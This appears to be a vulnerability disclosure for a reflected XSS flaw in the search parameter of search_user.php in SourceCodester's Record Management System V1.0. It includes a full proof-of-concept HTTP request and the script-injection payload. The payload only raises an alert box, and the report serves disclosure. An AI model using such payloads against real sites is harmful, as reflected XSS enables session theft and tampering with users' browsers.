#### BUG_AUTHOR:acmglz
# Record management system – reflected XSS on (search_user.php search parameter) 
## Vendor Homepage:
https://www.sourcecodester.com/php/5107/record-management-system.html 
## Version:V1.0
## Tested on: PHP, Apache, MySQL
## Affected Page:
search_user.php

On this page, search parameter is vulnerable to reflected XSS Attack 
## Proof of vulnerability:
## Request:
```
POST http://192.168.0.100/Personnel_record_management_system/search_user.php HTTP/1.1
Host: 192.168.0.100
Content-Length: 52
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.100
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.100/Personnel_record_management_system/search_user.php
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=52388hjgjeif4bl4r5sqp2bmpm
Connection: close

search=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```
## Payload：
```
"><script>alert(1)</script>
```
<img width="416" alt="image" src="https://github.com/user-attachments/assets/834a2420-d5a0-4366-a6e0-f707458818a7">

## Trigger popup：
<img width="416" alt="image" src="https://github.com/user-attachments/assets/10d6d34b-0c06-41c0-8de3-96924fc45b4f">
